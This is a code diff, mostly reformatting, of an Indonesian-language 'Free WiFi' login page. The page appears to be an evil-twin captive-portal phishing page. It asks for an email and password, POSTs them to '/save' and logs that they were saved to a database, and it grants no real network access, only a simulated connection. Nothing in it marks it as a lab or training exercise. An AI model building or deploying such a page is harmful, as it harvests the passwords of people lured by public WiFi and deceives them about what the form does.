@@ -1,32 +1,44 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free WiFi - Login Required</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="/output.css" rel="stylesheet">
+
+    <!-- <script src="https://cdn.tailwindcss.com"></script> -->
     <style>
         .wifi-animation {
             animation: pulse 2s infinite;
         }
-        
+
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
         }
-        
+
         .gradient-bg {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         }
     </style>
 </head>
+
 <body class="gradient-bg min-h-screen flex items-center justify-center p-4">
     <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md p-8">
         <!-- WiFi Icon -->
         <div class="text-center mb-8">
             <div class="wifi-animation inline-block">
                 <svg class="w-16 h-16 mx-auto text-blue-600" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.07 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
+                    <path
+                        d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.07 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z" />
                 </svg>
             </div>
             <h1 class="text-2xl font-bold text-gray-800 mt-4">Free WiFi Access</h1>
@@ -39,47 +51,30 @@
                 <label for="email" class="block text-sm font-medium text-gray-700 mb-2">
                     Email Address
                 </label>
-                <input 
-                    type="email" 
-                    id="email" 
-                    name="email"
-                    required
+                <input type="email" id="email" name="email" required
                     class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition duration-200"
-                    placeholder="contoh@email.com"
-                >
+                    placeholder="contoh@email.com">
             </div>
 
             <div>
                 <label for="password" class="block text-sm font-medium text-gray-700 mb-2">
                     Password
                 </label>
-                <input 
-                    type="password" 
-                    id="password" 
-                    name="password"
-                    required
+                <input type="password" id="password" name="password" required
                     class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition duration-200"
-                    placeholder="Masukkan password"
-                >
+                    placeholder="Masukkan password">
             </div>
 
             <div class="flex items-center">
-                <input 
-                    type="checkbox" 
-                    id="terms" 
-                    name="terms"
-                    required
-                    class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
-                >
+                <input type="checkbox" id="terms" name="terms" required
+                    class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                 <label for="terms" class="ml-2 block text-sm text-gray-700">
                     Saya setuju dengan <a href="#" class="text-blue-600 hover:underline">syarat dan ketentuan</a>
                 </label>
             </div>
 
-            <button 
-                type="submit"
-                class="w-full bg-blue-600 text-white py-3 px-4 rounded-lg hover:bg-blue-700 focus:ring-4 focus:ring-blue-200 transition duration-200 font-medium"
-            >
+            <button type="submit"
+                class="w-full bg-blue-600 text-white py-3 px-4 rounded-lg hover:bg-blue-700 focus:ring-4 focus:ring-blue-200 transition duration-200 font-medium">
                 Connect to WiFi
             </button>
         </form>
@@ -94,7 +89,7 @@
         <div id="successState" class="hidden text-center py-8">
             <div class="text-green-600 mb-4">
                 <svg class="w-16 h-16 mx-auto" fill="currentColor" viewBox="0 0 24 24">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
                 </svg>
             </div>
             <h2 class="text-xl font-bold text-gray-800 mb-2">Berhasil Terhubung!</h2>
@@ -109,23 +104,23 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault();
-            
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const terms = document.getElementById('terms').checked;
-            
+
             // Validasi sederhana
             if (!email || !password || !terms) {
                 alert('Mohon lengkapi semua field dan setujui syarat & ketentuan');
                 return;
             }
-            
+
             // Sembunyikan form dan tampilkan loading
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loadingState').classList.remove('hidden');
-            
+
             fetch('/save', {
                 method: 'POST',
                 headers: {
@@ -133,42 +128,43 @@
                 },
                 body: JSON.stringify({ email, password })
             })
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById('loadingState').classList.add('hidden');
-                document.getElementById('successState').classList.remove('hidden');
-                console.log('Disimpan ke DB:', data);
-            })
-            .catch(err => {
-                console.error('Error:', err);
-            });
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('loadingState').classList.add('hidden');
+                    document.getElementById('successState').classList.remove('hidden');
+                    console.log('Disimpan ke DB:', data);
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                });
 
             // Simulasi proses koneksi (dalam implementasi nyata, ini akan mengirim data ke server)
-            setTimeout(function() {
+            setTimeout(function () {
                 // Sembunyikan loading dan tampilkan success
                 document.getElementById('loadingState').classList.add('hidden');
                 document.getElementById('successState').classList.remove('hidden');
-                
+
                 // Dalam implementasi nyata, redirect ke halaman internet atau buka akses
-                setTimeout(function() {
+                setTimeout(function () {
                     // Redirect ke halaman sukses atau buka akses internet
                     // window.location.href = 'https://google.com';
                     console.log('User connected with email:', email);
                 }, 2000);
             }, 3000);
         });
-        
+
         // Animasi tambahan untuk input focus
         const inputs = document.querySelectorAll('input[type="email"], input[type="password"]');
         inputs.forEach(input => {
-            input.addEventListener('focus', function() {
+            input.addEventListener('focus', function () {
                 this.parentElement.classList.add('transform', 'scale-105');
             });
-            
-            input.addEventListener('blur', function() {
+
+            input.addEventListener('blur', function () {
                 this.parentElement.classList.remove('transform', 'scale-105');
             });
         });
     </script>
 </body>
+
 </html>
